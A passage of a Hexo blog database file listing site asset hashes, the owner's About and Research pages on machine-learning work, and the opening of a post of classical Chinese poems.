cb7e2dc89cc575b","modified":1528387621271},{"_id":"public/images/apple-touch-icon.png","hash":"83d8f04ec918fc770bb7d492e07ac441175f0b05","modified":1528387621271},{"_id":"public/images/favicon.ico","hash":"d24fb8be0c9eaf45993a093638d6645470f942e2","modified":1528387621271},{"_id":"public/images/favicon-200x200.png","hash":"83d8f04ec918fc770bb7d492e07ac441175f0b05","modified":1528387621271},{"_id":"public/lib/vazir-font/Vazir-Bold.woff2","hash":"1f3e8d1b0cd6e77c861e3d9326aaaab42ab32850","modified":1528387621271},{"_id":"public/lib/vazir-font/Vazir-Bold.woff","hash":"6c6dfec4dbaff4850225f931d3bba53675651fa7","modified":1528387621271},{"_id":"public/lib/vazir-font/Vazir-Light.woff2","hash":"fa68ba20ee5a58b431ed0aeee37a54b78e99890e","modified":1528387621271},{"_id":"public/lib/vazir-font/Vazir-Light.woff","hash":"4a51786e743c6fb3a14f9c04e712a40ae8a15a5a","modified":1528387621272},{"_id":"public/lib/vazir-font/Vazir.woff","hash":"072460f4c8ef03ab81be9128e0e3509f1f925767","modified":1528387621272},{"_id":"public/lib/vazir-font/Vazir.woff2","hash":"428df6ad6d662532e8e8239353d4623b88373668","modified":1528387621272},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff2","hash":"b2258ca3824c7e0a03efe19edc10d54571fcf0b4","modified":1528387621272},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.woff","hash":"065d1184f7256fc4897a1c3023a361b2491282e1","modified":1528387621272},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.eot","hash":"74b3228a2cc98d96ddcd095915dd770c27cd2858","modified":1528387621272},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.ttf","hash":"45bb0eb8b57b864dbf7da820fd8dc17b296753ee","modified":1528387621272},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff","hash":"09fe1eedfc1378d20828d07cbaf0a15284757211","modified":1528387621272},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.woff2","hash":"28844ababc02fe5cea50bec9321da0a492ce1369","modified":1528387621272},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff","hash":"05d552c1d360502f134a3aa37580373b14d65797","modified":1528387621272},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.woff2","hash":"7a4c38d80cab424875ffcfc090ad3941e0f7a4cf","modified":1528387621272},{"_id":"public/images/in-post/post-blog-WeatherEmail.jpg","hash":"1e1865e208cb92ae4f0b39bcc5c5529f9e60332c","modified":1528387621498},{"_id":"public/images/in-post/post-blog-backpropfyd.png","hash":"5617cb72e54c6c62ef9a75e7ba2196cbecaf4ee3","modified":1528387621499},{"_id":"public/images/in-post/post-blog-j0serv1.png","hash":"a8c989f79729c5c5d1aec6f87aaa8cd1c0592535","modified":1528387621499},{"_id":"public/images/in-post/post-blog-j0serv7.png","hash":"61f0ac3122e8428fa9995ae751cdeab6f0b1e978","modified":1528387621500},{"_id":"public/images/in-post/post-blog-jserv12.png","hash":"e80207e5d7d79803e6e46a7c4b61c66d3fe086c3","modified":1528387621500},{"_id":"public/images/in-post/post-blog-jserv19.png","hash":"2f138961ed77bb1f812d9328c588896817c93bae","modified":1528387621500},{"_id":"public/images/in-post/post-blog-jserv22.png","hash":"b29e729fabed41eba374929d87d9db0faec83f6c","modified":1528387621500},{"_id":"public/images/in-post/post-blog-jserv5.png","hash":"736056a3929c69e06e2ce76f0300e0d0dbf59aa3","modified":1528387621500},{"_id":"public/images/in-post/post-blog-jserv8.png","hash":"fffd8d37e205212ee361436ffc83a0ef3236b48e","modified":1528387621500},{"_id":"public/images/avatar-myl.jpg","hash":"81a4952646a50b59c48ec7d1ef8fdc74670c89af","modified":1528387621500},{"_id":"public/lib/vazir-font/Vazir-Bold.eot","hash":"5706a20a89888535e0d3615d7ee6dc51d3bdd23b","modified":1528387621500},{"_id":"public/lib/vazir-font/Vazir-Bold.ttf","hash":"c2a312c63dbbaec50d15bace1f13c672603cf098","modified":1528387621500},{"_id":"public/lib/vazir-font/Vazir-Light.eot","hash":"e9ff71c83c56e7a9c098fe17b5520b55fb3b7f93","modified":1528387621501},{"_id":"public/lib/vazir-font/Vazir-Light.ttf","hash":"b0a3639e51810b7a5fb6ba6d6c72dc96c3e2e827","modified":1528387621501},{"_id":"public/lib/vazir-font/Vazir.eot","hash":"265d748c0e62330ad0286acae64a42d6db983531","modified":1528387621501},{"_id":"public/lib/vazir-font/Vazir.ttf","hash":"ca62b35a88ef3d09d058eea5cfdafba86ec361c7","modified":1528387621501},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.eot","hash":"f92896ce0243daa72a6bd71a026ed7c9906f921e","modified":1528387621501},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.ttf","hash":"f9f34b664f8bf760f3f848d6a31d14ab0e029993","modified":1528387621501},{"_id":"public/lib/font-awesome/webfonts/fa-regular-400.svg","hash":"e33b44e6286ab4134c3002391e81a1c9c84a6a0a","modified":1528387621501},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.eot","hash":"d775b9bf2ea3da471494a684baa56e312e906884","modified":1528387621501},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.ttf","hash":"54d03b85192ebeaa6d34e680326bd4c0e1322296","modified":1528387621501},{"_id":"public/css/rtl.css","hash":"e740075e5ae62b9fe7bd906a38caf7a0a694be1f","modified":1528387621512},{"_id":"public/js/main.js","hash":"4659a6f4e3b988034c984cf81d16623d68624118","modified":1528387621512},{"_id":"public/js/search.js","hash":"ba2947a9a6107a529f95281795bc5fa9cbc17b9f","modified":1528387621512},{"_id":"public/lib/justified-gallery/css/justifiedGallery.min.css","hash":"e7ba2de65435a0067d64f49b92a6d395cab508cc","modified":1528387621512},{"_id":"public/css/style.css","hash":"54ba3594d66046bc89f99135244fad81ad20596f","modified":1528387621512},{"_id":"public/lib/jquery/jquery.min.js","hash":"0dc32db4aa9c5f03f3b38c47d883dbd4fed13aae","modified":1528387621512},{"_id":"public/lib/font-awesome/css/fontawesome-all.min.css","hash":"dac0b9af15b6aa47b072469eb440cbe8fee16034","modified":1528387621513},{"_id":"public/lib/justified-gallery/js/jquery.justifiedGallery.min.js","hash":"1151c5ef92d121329e8ef75ea997a5b79babc00b","modified":1528387621513},{"_id":"public/images/in-post/post-blog-DNNartstyle3.jpg","hash":"bc62338374bd2cfcd91f0ca394eb651656adad46","modified":1528387621513},{"_id":"public/images/in-post/post-blog-DNNytbmatch.png","hash":"f1d28ff39140136d350856067a92f5e0ee2dc869","modified":1528387621513},{"_id":"public/images/in-post/post-blog-DNNytbrank.png","hash":"76be1432f8ae8c0165b66072fc80d9d25fed2a8d","modified":1528387621513},{"_id":"public/images/in-post/post-blog-jserv6.png","hash":"0f34916268a821e14d2c4e277fb96a9c47997c39","modified":1528387621513},{"_id":"public/images/in-post/post-blog-DNNartstyle5.jpg","hash":"206f63f416d02442d807f65786daea207f91d0e1","modified":1528387621524},{"_id":"public/images/in-post/post-blog-jserv16.png","hash":"74620100bb1821a80cbc119c5fa5998f126bc0b2","modified":1528387621524},{"_id":"public/images/in-post/post-blog-jserv17.png","hash":"8fc39e3790caca584f73d8da498a7c8878628629","modified":1528387621524},{"_id":"public/images/in-post/post-blog-jserv21.png","hash":"acbdfbe0cfa77ba9486572cf1b76f61f4690decb","modified":1528387621525},{"_id":"public/images/in-post/post-blog-jserv4.png","hash":"e9763b97da4551571e575794637679442d6a790c","modified":1528387621525},{"_id":"public/lib/meslo-LG/MesloLGL-BoldItalic.ttf","hash":"b7d24ab1e4fad720f31a2b0cca1904ce1740d846","modified":1528387621541},{"_id":"public/lib/meslo-LG/MesloLGM-BoldItalic.ttf","hash":"b542b9591fbf33925d93f0695b6e123a9f0cfd43","modified":1528387621541},{"_id":"public/lib/meslo-LG/MesloLGS-BoldItalic.ttf","hash":"926035f0156cccf1b0ca507347f39bf9c510f51e","modified":1528387621542},{"_id":"public/lib/font-awesome/webfonts/fa-solid-900.svg","hash":"8f8c9e3cc2fea292023f6ac5fe73ca1182ac9ef4","modified":1528387621542},{"_id":"public/images/in-post/post-blog-DANmdoel.png","hash":"83544427587bb59d3e546ef16a19117c30df75b8","modified":1528387621553},{"_id":"public/images/in-post/post-blog-domainadp.png","hash":"df79b11846e79af0b73110c8fc9f501056a4654e","modified":1528387621553},{"_id":"public/images/in-post/post-blog-jserv15.png","hash":"aee58d51de4b6df04880ec19525e8d2bc94bd6fe","modified":1528387621553},{"_id":"public/images/in-post/post-blog-jserv20.png","hash":"40ae54ce9db616a3f651013ecd7154ee4454941c","modified":1528387621554},{"_id":"public/lib/meslo-LG/MesloLGL-Italic.ttf","hash":"9a23c6898b0943bd3d96c04df9a0f66e919451d8","modified":1528387621554},{"_id":"public/lib/meslo-LG/MesloLGM-Italic.ttf","hash":"93ebc5098cf57a32b7b8d297681f31692c09bdfa","modified":1528387621555},{"_id":"public/lib/meslo-LG/MesloLGS-Italic.ttf","hash":"9d757cc9f928fc83b2133283dd639c12b11d94ad","modified":1528387621555},{"_id":"public/images/blog-EEGDAN.png","hash":"5d6e3aa027df25749d9a558f25f86f11799f7fe3","modified":1528387621574},{"_id":"public/images/in-post/post-blog-jserv13.png","hash":"e2950dbdc61f57a2e010450a95e6ab06d5248545","modified":1528387621574},{"_id":"public/lib/meslo-LG/MesloLGL-Bold.ttf","hash":"34f7db59f1d023294e69976aa20b7d52b86165a4","modified":1528387621575},{"_id":"public/lib/meslo-LG/MesloLGL-Regular.ttf","hash":"6c090d6bff3928fbf8a5f4104e58ed7f421aea7c","modified":1528387621576},{"_id":"public/lib/meslo-LG/MesloLGM-Bold.ttf","hash":"58be4b7760e9a84daa81929d046f9a15c4fd1c1a","modified":1528387621577},{"_id":"public/lib/meslo-LG/MesloLGM-Regular.ttf","hash":"20ce1fc7ae1254558ca044ae48283faaa58897e5","modified":1528387621579},{"_id":"public/lib/meslo-LG/MesloLGS-Bold.ttf","hash":"f9918fb93d6ab6850f5d38069a999c311af78816","modified":1528387621581},{"_id":"public/lib/meslo-LG/MesloLGS-Regular.ttf","hash":"de559f8d70d5b1ab2810597bfd0b1b9506f3ef01","modified":1528387621582},{"_id":"public/lib/font-awesome/webfonts/fa-brands-400.svg","hash":"96b228c76e6cc3b70f6e47b7a5662b358bd10c46","modified":1528387621583},{"_id":"public/images/in-post/post-blog-DNNartstyle1.png","hash":"18489dc6a04e0502970df4c56de09167bc79a4b1","modified":1528387621647},{"_id":"public/images/in-post/post-blog-DNNartstyle2.png","hash":"5bf06ae7ddd012160dddd0c87e80c972ae1683ef","modified":1528387621647},{"_id":"public/images/in-post/post-blog-DNNartstyle4.png","hash":"9778034a2a777e2fda00dc56ecf8959b2ea0892e","modified":1528387621647},{"_id":"public/images/in-post/post-blog-DNNartstyle6.png","hash":"20180da034307fb86dffc52f83de7733fb539c13","modified":1528387621652},{"_id":"public/images/in-post/post-blog-jserv18.png","hash":"604cd8b1e0344f9fe241d4785014a1fd8d2aa228","modified":1528387621664},{"_id":"public/images/in-post/post-blog-Lucene.png","hash":"7db6bce45422f346362966bcc4cb9519e8f00a6b","modified":1528387621667},{"_id":"public/images/in-post/post-blog-jserv14.png","hash":"a0818e246ac218ab0c8d9ddbe46af67960361273","modified":1528387621670},{"_id":"public/images/in-post/post-blog-j0serv8.gif","hash":"446394db6e3e62f4d19ed99648bcada3386a32cc","modified":1528387621681},{"_id":"public/images/in-post/post-blog-jserv2.png","hash":"e9b10176477befaa9549f02813f911791f7fc67e","modified":1528387621687},{"_id":"public/docs/in-post/Junior0ctfQuestion.zip","hash":"21ea9e19ed80971f17b32e9a186928d535f81d53","modified":1528387621691},{"_id":"public/docs/ICOT2017.pptx","hash":"b1a3847159a7ebf89418705d2a2334e0dfac4a1f","modified":1528387621695},{"_id":"source/images/blog-portraitdemo1.gif","hash":"e72f17dab56c061d34de1835542d4659216e0961","modified":1521906310000},{"_id":"source/images/blog-portraitdemo0.gif","hash":"c5ee93c49dddec7895f678041beba70b32ce81a2","modified":1521906310000},{"_id":"public/images/blog-portraitdemo1.gif","hash":"e72f17dab56c061d34de1835542d4659216e0961","modified":1528389068399},{"_id":"public/images/blog-portraitdemo0.gif","hash":"c5ee93c49dddec7895f678041beba70b32ce81a2","modified":1528389068428},{"_id":"source/images/blog-transp.png","hash":"5baf2017fb26d872073fa9051facf00ff81890d9","modified":1528390792000},{"_id":"public/images/blog-transp.png","hash":"5baf2017fb26d872073fa9051facf00ff81890d9","modified":1528390813283},{"_id":"source/_posts/2018-06-14-escpfromnetease.markdown","hash":"9565bf27c8dc72eb633043420d6e7c54d41a8e1c","modified":1528978642000},{"_id":"source/images/in-post/post-blog-kimino.png","hash":"faf52f8c5edd71a904e356e2c1bbaf5e9dc80c83","modified":1528958349000},{"_id":"public/archives/2018/06/index.html","hash":"eab947e0f783b080779213590c8f5758fbc61a19","modified":1528978406398},{"_id":"public/2018/06/14/escpfromnetease/index.html","hash":"3302ae5eca3edab6edd6ba5560c7861755a734b6","modified":1528978649742},{"_id":"public/images/in-post/post-blog-kimino.png","hash":"faf52f8c5edd71a904e356e2c1bbaf5e9dc80c83","modified":1528978406401}],"Category":[],"Data":[{"_id":"projects","data":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Cm5sclock","url":"http://cmsclock.miyunluo.com","desc":"桜の花の落ちるスピード。秒速5センチメートル"}]}],"Page":[{"layout":"page","title":"About","comments":0,"share":false,"mathjax":false,"hidedate":true,"_content":"\n> # Luo, Yu Dong\n> # 罗煜东\n> - Undergraduate in Computer Science, Shanghai Jiao Tong University\n> - Will begin MPhil at fall 2018, Simon Fraser University, Canada\n> - Love guitar but not good at\n\n---\n\n# Contact\n\n+ E-mail: i@miyunluo.com\n+ WeChat: mi_yunluo\n\n# Experience\n\n> Research\n\n+ AI Lab3, National University of Singapore, with Prof. [Yair Zick](http://www.comp.nus.edu.sg/~zick/)\n\n  **Algorithm Transparency**, July - Sep. 2017\n\n+ BCMI, Shanghai Jiao Tong University, with Prof. [Bao-Liang Lu](http://bcmi.sjtu.edu.cn/~blu/)\n\n  **Transfer Learning** for Emotion Recognition, Sep. 2016 - April 2017\n\n> Work\n\n+ **Baidu Inc.**, Shanghai\n\n  April 2017 - Now\n\n+ **Tencent**, Shanghai\n\n  March - April 2017\n\n\n\n---\n\n\n\n# 遗憾list\n\n记录一些遗憾的事情\n\n+ 2017年3月联系过Sinno Pan教授，得到了回复，却被自己忽视了。","source":"about.md","raw":"---\nlayout: page\npermalink: /about/\ntitle: About\ncomments: false\nshare: false\nmathjax: false\nhidedate: true\n---\n\n> # Luo, Yu Dong\n> # 罗煜东\n> - Undergraduate in Computer Science, Shanghai Jiao Tong University\n> - Will begin MPhil at fall 2018, Simon Fraser University, Canada\n> - Love guitar but not good at\n\n---\n\n# Contact\n\n+ E-mail: i@miyunluo.com\n+ WeChat: mi_yunluo\n\n# Experience\n\n> Research\n\n+ AI Lab3, National University of Singapore, with Prof. [Yair Zick](http://www.comp.nus.edu.sg/~zick/)\n\n  **Algorithm Transparency**, July - Sep. 2017\n\n+ BCMI, Shanghai Jiao Tong University, with Prof. [Bao-Liang Lu](http://bcmi.sjtu.edu.cn/~blu/)\n\n  **Transfer Learning** for Emotion Recognition, Sep. 2016 - April 2017\n\n> Work\n\n+ **Baidu Inc.**, Shanghai\n\n  April 2017 - Now\n\n+ **Tencent**, Shanghai\n\n  March - April 2017\n\n\n\n---\n\n\n\n# 遗憾list\n\n记录一些遗憾的事情\n\n+ 2017年3月联系过Sinno Pan教授，得到了回复，却被自己忽视了。","date":"2018-05-22T09:58:21.000Z","updated":"2018-05-22T09:58:21.000Z","path":"/about/index.html","_id":"cji4qiz8t0000riketh8eh7ay","content":"<blockquote>\n<h1 id=\"Luo-Yu-Dong\"><a href=\"#Luo-Yu-Dong\" class=\"headerlink\" title=\"Luo, Yu Dong\"></a>Luo, Yu Dong</h1><h1 id=\"罗煜东\"><a href=\"#罗煜东\" class=\"headerlink\" title=\"罗煜东\"></a>罗煜东</h1><ul>\n<li>Undergraduate in Computer Science, Shanghai Jiao Tong University</li>\n<li>Will begin MPhil at fall 2018, Simon Fraser University, Canada</li>\n<li>Love guitar but not good at</li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"Contact\"><a href=\"#Contact\" class=\"headerlink\" title=\"Contact\"></a>Contact</h1><ul>\n<li>E-mail: <a href=\"mailto:i@miyunluo.com\">i@miyunluo.com</a></li>\n<li>WeChat: mi_yunluo</li>\n</ul>\n<h1 id=\"Experience\"><a href=\"#Experience\" class=\"headerlink\" title=\"Experience\"></a>Experience</h1><blockquote>\n<p>Research</p>\n</blockquote>\n<ul>\n<li><p>AI Lab3, National University of Singapore, with Prof. <a href=\"http://www.comp.nus.edu.sg/~zick/\" target=\"_blank\" rel=\"noopener\">Yair Zick</a></p>\n<p><strong>Algorithm Transparency</strong>, July - Sep. 2017</p>\n</li>\n<li><p>BCMI, Shanghai Jiao Tong University, with Prof. <a href=\"http://bcmi.sjtu.edu.cn/~blu/\" target=\"_blank\" rel=\"noopener\">Bao-Liang Lu</a></p>\n<p><strong>Transfer Learning</strong> for Emotion Recognition, Sep. 2016 - April 2017</p>\n</li>\n</ul>\n<blockquote>\n<p>Work</p>\n</blockquote>\n<ul>\n<li><p><strong>Baidu Inc.</strong>, Shanghai</p>\n<p>April 2017 - Now</p>\n</li>\n<li><p><strong>Tencent</strong>, Shanghai</p>\n<p>March - April 2017</p>\n</li>\n</ul>\n<hr>\n<h1 id=\"遗憾list\"><a href=\"#遗憾list\" class=\"headerlink\" title=\"遗憾list\"></a>遗憾list</h1><p>记录一些遗憾的事情</p>\n<ul>\n<li>2017年3月联系过Sinno Pan教授，得到了回复，却被自己忽视了。</li>\n</ul>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Easy Flash Tool","url":"https://github.com/miyunluo/CortexM4-flashtool","desc":"A easy python flash tool for TI TM4C1294"}]}},"excerpt":"","more":"<blockquote>\n<h1 id=\"Luo-Yu-Dong\"><a href=\"#Luo-Yu-Dong\" class=\"headerlink\" title=\"Luo, Yu Dong\"></a>Luo, Yu Dong</h1><h1 id=\"罗煜东\"><a href=\"#罗煜东\" class=\"headerlink\" title=\"罗煜东\"></a>罗煜东</h1><ul>\n<li>Undergraduate in Computer Science, Shanghai Jiao Tong University</li>\n<li>Will begin MPhil at fall 2018, Simon Fraser University, Canada</li>\n<li>Love guitar but not good at</li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"Contact\"><a href=\"#Contact\" class=\"headerlink\" title=\"Contact\"></a>Contact</h1><ul>\n<li>E-mail: <a href=\"mailto:i@miyunluo.com\">i@miyunluo.com</a></li>\n<li>WeChat: mi_yunluo</li>\n</ul>\n<h1 id=\"Experience\"><a href=\"#Experience\" class=\"headerlink\" title=\"Experience\"></a>Experience</h1><blockquote>\n<p>Research</p>\n</blockquote>\n<ul>\n<li><p>AI Lab3, National University of Singapore, with Prof. <a href=\"http://www.comp.nus.edu.sg/~zick/\" target=\"_blank\" rel=\"noopener\">Yair Zick</a></p>\n<p><strong>Algorithm Transparency</strong>, July - Sep. 2017</p>\n</li>\n<li><p>BCMI, Shanghai Jiao Tong University, with Prof. <a href=\"http://bcmi.sjtu.edu.cn/~blu/\" target=\"_blank\" rel=\"noopener\">Bao-Liang Lu</a></p>\n<p><strong>Transfer Learning</strong> for Emotion Recognition, Sep. 2016 - April 2017</p>\n</li>\n</ul>\n<blockquote>\n<p>Work</p>\n</blockquote>\n<ul>\n<li><p><strong>Baidu Inc.</strong>, Shanghai</p>\n<p>April 2017 - Now</p>\n</li>\n<li><p><strong>Tencent</strong>, Shanghai</p>\n<p>March - April 2017</p>\n</li>\n</ul>\n<hr>\n<h1 id=\"遗憾list\"><a href=\"#遗憾list\" class=\"headerlink\" title=\"遗憾list\"></a>遗憾list</h1><p>记录一些遗憾的事情</p>\n<ul>\n<li>2017年3月联系过Sinno Pan教授，得到了回复，却被自己忽视了。</li>\n</ul>\n"},{"layout":"page","title":"Research","comments":0,"share":false,"mathjax":false,"hidedate":true,"_content":"## Academic Publication ##\n\n+ EEG-based Emotion Recognition using Domain Adaptation Network, ICOT 2017\\[[slides](/docs/ICOT2017.pptx)]\\[[pdf](https://ieeexplore.ieee.org/abstract/document/8336126/)]\n\n\n## Academic Projects ##\n\n+ **Algorithm Transparency for Image and Text Classification Tasks**\n\n  ![img](/images/blog-transp.png)\n\n  Algotithm transparency is essential for machine learning tasks in order to trust a model. Two recommend paper [LIME](http://www.kdd.org/kdd2016/papers/files/rfp0573-ribeiroA.pdf) and [QII](http://www.comp.nus.edu.sg/~zick/papers/transparency.oakland16.pdf). \n\n+ **EEG-based Emotion Recognition using Domain Adaptation Network**\n\n  ![img](/images/blog-EEGDAN.png)\n\n  EEG gathered from different subjects vary significantly. Transfer learning is a proper method to promote the accuracy of model on different domains.\n\n  [read more](https://ieeexplore.ieee.org/abstract/document/8336126/)\n\n## Others ##\n\n+ Image super-resolution using Convolutional Neural Network\n\n  Shrinking -> mapping -> expanding, peak signal to noise ratio 29.4\n\n+ Automatic Video Portrait Segmentation\n\n  [Demo(orig)](/images/blog-portraitdemo0.gif) [Demo(segm)](/images/blog-portraitdemo1.gif)\n\n+ SmallC compiler\n\n  A compiler for a simplified C-liked language named Small-C [link](https://github.com/miyunluo/SmallC_Compiler)","source":"research.md","raw":"---\nlayout: page\ntitle: Research\npermalink: /research/\ncomments: false\nshare: false\nmathjax: false\nhidedate: true\n---\n## Academic Publication ##\n\n+ EEG-based Emotion Recognition using Domain Adaptation Network, ICOT 2017\\[[slides](/docs/ICOT2017.pptx)]\\[[pdf](https://ieeexplore.ieee.org/abstract/document/8336126/)]\n\n\n## Academic Projects ##\n\n+ **Algorithm Transparency for Image and Text Classification Tasks**\n\n  ![img](/images/blog-transp.png)\n\n  Algotithm transparency is essential for machine learning tasks in order to trust a model. Two recommend paper [LIME](http://www.kdd.org/kdd2016/papers/files/rfp0573-ribeiroA.pdf) and [QII](http://www.comp.nus.edu.sg/~zick/papers/transparency.oakland16.pdf). \n\n+ **EEG-based Emotion Recognition using Domain Adaptation Network**\n\n  ![img](/images/blog-EEGDAN.png)\n\n  EEG gathered from different subjects vary significantly. Transfer learning is a proper method to promote the accuracy of model on different domains.\n\n  [read more](https://ieeexplore.ieee.org/abstract/document/8336126/)\n\n## Others ##\n\n+ Image super-resolution using Convolutional Neural Network\n\n  Shrinking -> mapping -> expanding, peak signal to noise ratio 29.4\n\n+ Automatic Video Portrait Segmentation\n\n  [Demo(orig)](/images/blog-portraitdemo0.gif) [Demo(segm)](/images/blog-portraitdemo1.gif)\n\n+ SmallC compiler\n\n  A compiler for a simplified C-liked language named Small-C [link](https://github.com/miyunluo/SmallC_Compiler)","date":"2018-06-07T16:56:48.000Z","updated":"2018-06-07T16:56:48.000Z","path":"/research/index.html","_id":"cji4qiz8u0001rikevw3ib71z","content":"<h2 id=\"Academic-Publication\"><a href=\"#Academic-Publication\" class=\"headerlink\" title=\"Academic Publication\"></a>Academic Publication</h2><ul>\n<li>EEG-based Emotion Recognition using Domain Adaptation Network, ICOT 2017[<a href=\"/docs/ICOT2017.pptx\">slides</a>][<a href=\"https://ieeexplore.ieee.org/abstract/document/8336126/\" target=\"_blank\" rel=\"noopener\">pdf</a>]</li>\n</ul>\n<h2 id=\"Academic-Projects\"><a href=\"#Academic-Projects\" class=\"headerlink\" title=\"Academic Projects\"></a>Academic Projects</h2><ul>\n<li><p><strong>Algorithm Transparency for Image and Text Classification Tasks</strong></p>\n<p><img src=\"/images/blog-transp.png\" alt=\"img\"></p>\n<p>Algotithm transparency is essential for machine learning tasks in order to trust a model. Two recommend paper <a href=\"http://www.kdd.org/kdd2016/papers/files/rfp0573-ribeiroA.pdf\" target=\"_blank\" rel=\"noopener\">LIME</a> and <a href=\"http://www.comp.nus.edu.sg/~zick/papers/transparency.oakland16.pdf\" target=\"_blank\" rel=\"noopener\">QII</a>. </p>\n</li>\n<li><p><strong>EEG-based Emotion Recognition using Domain Adaptation Network</strong></p>\n<p><img src=\"/images/blog-EEGDAN.png\" alt=\"img\"></p>\n<p>EEG gathered from different subjects vary significantly. Transfer learning is a proper method to promote the accuracy of model on different domains.</p>\n<p><a href=\"https://ieeexplore.ieee.org/abstract/document/8336126/\" target=\"_blank\" rel=\"noopener\">read more</a></p>\n</li>\n</ul>\n<h2 id=\"Others\"><a href=\"#Others\" class=\"headerlink\" title=\"Others\"></a>Others</h2><ul>\n<li><p>Image super-resolution using Convolutional Neural Network</p>\n<p>Shrinking -&gt; mapping -&gt; expanding, peak signal to noise ratio 29.4</p>\n</li>\n<li><p>Automatic Video Portrait Segmentation</p>\n<p><a href=\"/images/blog-portraitdemo0.gif\">Demo(orig)</a> <a href=\"/images/blog-portraitdemo1.gif\">Demo(segm)</a></p>\n</li>\n<li><p>SmallC compiler</p>\n<p>A compiler for a simplified C-liked language named Small-C <a href=\"https://github.com/miyunluo/SmallC_Compiler\" target=\"_blank\" rel=\"noopener\">link</a></p>\n</li>\n</ul>\n","site":{"data":{"projects":[{"name":"Sjtueat","url":"http://sjtueat.miyunluo.com","desc":"Help you to decide what to eat today"},{"name":"Cm5sclock","url":"http://cmsclock.miyunluo.com","desc":"桜の花の落ちるスピード。秒速5センチメートル"}]}},"excerpt":"","more":"<h2 id=\"Academic-Publication\"><a href=\"#Academic-Publication\" class=\"headerlink\" title=\"Academic Publication\"></a>Academic Publication</h2><ul>\n<li>EEG-based Emotion Recognition using Domain Adaptation Network, ICOT 2017[<a href=\"/docs/ICOT2017.pptx\">slides</a>][<a href=\"https://ieeexplore.ieee.org/abstract/document/8336126/\" target=\"_blank\" rel=\"noopener\">pdf</a>]</li>\n</ul>\n<h2 id=\"Academic-Projects\"><a href=\"#Academic-Projects\" class=\"headerlink\" title=\"Academic Projects\"></a>Academic Projects</h2><ul>\n<li><p><strong>Algorithm Transparency for Image and Text Classification Tasks</strong></p>\n<p><img src=\"/images/blog-transp.png\" alt=\"img\"></p>\n<p>Algotithm transparency is essential for machine learning tasks in order to trust a model. Two recommend paper <a href=\"http://www.kdd.org/kdd2016/papers/files/rfp0573-ribeiroA.pdf\" target=\"_blank\" rel=\"noopener\">LIME</a> and <a href=\"http://www.comp.nus.edu.sg/~zick/papers/transparency.oakland16.pdf\" target=\"_blank\" rel=\"noopener\">QII</a>. </p>\n</li>\n<li><p><strong>EEG-based Emotion Recognition using Domain Adaptation Network</strong></p>\n<p><img src=\"/images/blog-EEGDAN.png\" alt=\"img\"></p>\n<p>EEG gathered from different subjects vary significantly. Transfer learning is a proper method to promote the accuracy of model on different domains.</p>\n<p><a href=\"https://ieeexplore.ieee.org/abstract/document/8336126/\" target=\"_blank\" rel=\"noopener\">read more</a></p>\n</li>\n</ul>\n<h2 id=\"Others\"><a href=\"#Others\" class=\"headerlink\" title=\"Others\"></a>Others</h2><ul>\n<li><p>Image super-resolution using Convolutional Neural Network</p>\n<p>Shrinking -&gt; mapping -&gt; expanding, peak signal to noise ratio 29.4</p>\n</li>\n<li><p>Automatic Video Portrait Segmentation</p>\n<p><a href=\"/images/blog-portraitdemo0.gif\">Demo(orig)</a> <a href=\"/images/blog-portraitdemo1.gif\">Demo(segm)</a></p>\n</li>\n<li><p>SmallC compiler</p>\n<p>A compiler for a simplified C-liked language named Small-C <a href=\"https://github.com/miyunluo/SmallC_Compiler\" target=\"_blank\" rel=\"noopener\">link</a></p>\n</li>\n</ul>\n"}],"Post":[{"layout":"post","title":"Don't know how to name a title","_content":"\n> “故事与事故. ”\n\n\n## 前言\n\n数量不多，质量也不好，选了几篇，留个纪念。\n\n\n\n---\n\n## 正文\n\n- #### 临江仙<br>\n十年心事十年忧，一枕凉簟清秋。梧桐听雨独倚楼，心海微澜，水浅不胜舟。<br>\n梦里曾记少年游，笑语盈盈谁羞。雨掸秋叶落肩头，欲言还休，只是去年愁。<br> \n(给XingWuXuanJi)\n\n\n---\n\n- #### 长相思<br>\n夜朦胧，鸟朦胧，长街柳岸雾华浓，无歌且听风。<br>\n山匆匆，水匆匆，心事只饮醉颜红，灯花已结空。\n\n\n---\n- #### 采桑子<br>\n虚竹一叶临窗扫，风也悄悄，人也悄悄，叶上寒露湿红梢。<br>\n却道何事伤心早，醒也烦恼，梦也烦恼，月下江村更寂寥。\n\n\n---\n- #### 柳梢青<br>\n一夜成霜，新花吹落，雨催寒食。浮生几何，光阴虚掷，不知何世。<br>\n飞鸿踏雪无字。觉几度，才下泪迟。沉思前事，去年此时，好景如斯。\n\n\n---\n- #### 青衫湿<br>\n青云沉笔雨淋铃，风吹花糁径。旧时书展，鸳鸯小字，湿遍青衫。<br>\n寻常往事，落樱犹滞，总负深情。欲结绸缪，料应未有，芷约兰期。<br>\n(读旧时书信)\n\n\n---\n- #### 踏莎行<br>\n归期未定，遣人闻惊。等闲谈笑声犹凝。常叹此生醉复醒，美景良辰把酒听。<br>\n新来多病，有泪如倾。朱颜暗换堪临镜。旧事如烟休重省，灯昏风定人初静。<br>\n(一面而别)\n\n\n---\n- #### 于中好•中秋<br>\n冷雨微收晓寒轻，红叶间漏过中庭。少年解舟对谁醒，梦里寒花落河星。<br>\n新明月，旧心情，斜阳清秋与云平。不负如来不负卿，也无风雨也无晴。<br>\n(10/04/2017)\n\n\n---\n\n\n## Addition\n\n- #### 